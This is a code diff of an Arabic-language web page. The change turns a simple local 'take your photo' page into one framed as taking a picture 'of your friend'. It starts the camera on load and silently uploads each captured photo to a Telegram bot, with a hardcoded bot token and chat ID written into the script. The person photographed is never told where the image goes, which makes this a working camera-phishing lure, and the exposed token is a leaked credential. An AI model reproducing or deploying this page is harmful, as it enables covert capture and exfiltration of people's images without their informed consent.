@@ -5,115 +5,70 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التقط صورة</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            background-color: #f0f2f5;
-            color: #333;
-        }
-        video {
-            width: 90%;
-            max-width: 400px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            background-color: #000;
-            margin-bottom: 20px;
-        }
-        button {
-            padding: 12px 25px;
-            font-size: 1.1em;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            box-shadow: 0 2px 10px rgba(0, 123, 255, 0.4);
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #message {
-            margin-top: 20px;
-            font-size: 0.9em;
-            color: #666;
-        }
-        #error-message {
-            color: red;
-            margin-top: 10px;
-        }
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
+        video { width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #000; }
+        button { margin-top: 20px; padding: 12px 25px; font-size: 1.1em; background-color: #007bff; color: white; border: none; border-radius: 50px; cursor: pointer; }
+        #status { margin-top: 15px; color: #555; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>التقط صورتك</h1>
-    <p id="message">سيطلب منك المتصفح الإذن للوصول للكاميرا.</p>
+
+    <h2>التقط صورة لصديقك 😜</h2>
     <video id="video" autoplay playsinline></video>
-    <button id="snap">التقط الصورة</button>
-    <p id="error-message" style="display:none;"></p>
+    <button id="snap">التقط الصورة الآن</button>
+    <p id="status"></p>
 
     <script>
         const video = document.getElementById('video');
         const snap = document.getElementById('snap');
-        const errorMessage = document.getElementById('error-message');
-        let stream; // لكي نتمكن من إيقاف الكاميرا لاحقاً
+        const status = document.getElementById('status');
 
-        // طلب الوصول للكاميرا
+        // املأ البيانات التالية:
+        const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
+        const chatId = '6002805119'; // احصل عليه من بوت userinfobot
+
+        // تشغيل الكاميرا فور فتح الصفحة
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(s => {
-                stream = s;
+            .then(stream => {
                 video.srcObject = stream;
-                video.play();
-                document.getElementById('message').innerText = "تمت الموافقة على الكاميرا. اضغط على 'التقط الصورة'.";
             })
             .catch(err => {
-                console.error("حدث خطأ في الوصول للكاميرا:", err);
-                errorMessage.style.display = 'block';
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    errorMessage.innerText = "لم يتم منح الإذن للوصول إلى الكاميرا. يرجى السماح بذلك من إعدادات المتصفح.";
-                } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-                    errorMessage.innerText = "لم يتم العثور على أي كاميرا. تأكد من توصيل كاميرا وعملها بشكل صحيح.";
-                } else {
-                    errorMessage.innerText = "حدث خطأ غير متوقع عند الوصول للكاميرا: " + err.message;
-                }
-                snap.disabled = true; // تعطيل زر التصوير
+                status.innerText = "يرجى السماح بالوصول للكاميرا لتتمكن من استخدام البوت.";
+                status.style.color = "red";
             });
 
-        // عند الضغط على زر "التقط الصورة"
         snap.addEventListener('click', () => {
+            status.innerText = "جاري التقاط الصورة وإرسالها...";
+            
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة إلى بيانات Base64 (نص)
-            const imageData = canvas.toDataURL('image/jpeg', 0.9); // 0.9 هي جودة الصورة
+            // تحويل الصورة إلى Blob لإرسالها كملف
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
 
-            // إيقاف تشغيل الكاميرا بعد التقاط الصورة
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-            }
-
-            // الآن، هنا سنرسل الصورة إلى البوت الخاص بك
-            // في هذه المرحلة، يجب أن يكون لديك رابط API Endpoint من البوت الخاص بك
-            // هذا الجزء سيتم تطويره لاحقاً بعد برمجة البوت
-
-            // كمثال مؤقت: يمكنك عرض الصورة في صفحة جديدة
-            const img = document.createElement('img');
-            img.src = imageData;
-            document.body.appendChild(img);
-            document.getElementById('message').innerText = "تم التقاط الصورة بنجاح! جاري الإرسال...";
-            
-            // هنا، سنحتاج لعنوان URL الخاص بالبوت ليتم إرسال الصورة إليه
-            // حاليا، لن يحدث شيء بعد الضغط على الزر حتى نجهز البوت
-            document.getElementById('message').innerText = "تم التقاط الصورة بنجاح! (جاري تجهيز إرسالها للبوت).";
-            snap.disabled = true; // تعطيل الزر بعد التصوير
+                // إرسال الصورة إلى API تيليجرام
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        status.innerText = "✅ تم إرسال الصورة بنجاح!";
+                        status.style.color = "green";
+                    } else {
+                        status.innerText = "❌ حدث خطأ أثناء الإرسال.";
+                    }
+                })
+                .catch(err => {
+                    status.innerText = "❌ خطأ في الاتصال.";
+                });
+            }, 'image/jpeg');
         });
     </script>
 </body>
